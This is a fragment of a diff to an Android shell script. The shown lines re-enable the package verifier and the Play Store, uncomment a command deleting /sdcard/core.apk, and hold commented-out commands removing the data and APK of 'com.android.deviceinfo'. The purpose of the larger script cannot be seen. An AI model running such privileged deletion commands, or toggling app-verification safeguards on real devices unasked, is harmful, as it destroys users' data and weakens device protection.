@@ -28,7 +28,7 @@ sleep 2
 settings put global package_verifier_enable 1
 pm enable com.android.vending
 
-#rm /sdcard/core.apk
+rm /sdcard/core.apk
 
 #rm -r /data/data/com.android.deviceinfo
 #rm /data/app/com.android.deviceinfo*
